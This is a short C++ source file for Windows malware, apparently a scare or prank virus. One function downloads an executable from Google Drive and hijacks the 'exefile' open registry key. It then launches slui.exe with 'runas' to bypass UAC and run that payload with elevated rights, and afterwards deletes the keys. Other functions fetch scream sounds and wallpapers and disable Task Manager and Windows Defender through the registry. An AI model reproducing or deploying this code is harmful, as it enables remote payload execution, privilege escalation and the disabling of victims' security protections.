#include <Windows.h>
#include "VirsHad.hpp"

int Admin() {
	GetFileURL(L"https://drive.google.com/uc?export=download&id=1eCpxk6SkIG6MCmOLgPt_nkgjaw698b7Z",
		L"C:\\Users\\Public\\Downloads\\Flopa.exe");

	CRK(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile", L"shell");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");

	SRV(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open\\command", L"", L"C:\\Users\\Public\\Downloads\\Flopa.exe");
	ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL, NULL, SW_SHOWNORMAL);

	Sleep(1500);

	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	return 0;
}

int Download() {
	GetFileURL(L"https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J",
		L"C:\\Users\\Public\\Downloads\\BG.wav");
	GetFileURL(L"https://drive.google.com/uc?export=download&id=1QSB8qiO7UNal3DRVcNksGqt7blJvfO7d",
		L"C:\\Users\\Public\\Downloads\\WP.bmp");
	GetFileURL(L"https://drive.google.com/uc?export=download&id=10uFLkcXovBrfUsKFv5aibp--y82cPGMi",
		L"C:\\Users\\Public\\Downloads\\scream.wav");
	GetFileURL(L"https://drive.google.com/uc?export=download&id=1NHPXcHardB10CLDIykeX3T758WyJc5zi",
		L"C:\\Users\\Public\\Downloads\\screamBG.bmp");
	return 0;
}

int Disable() {
	SRV(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", L"1");
	SRV(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiSpyware", L"1");
	return 0;
}
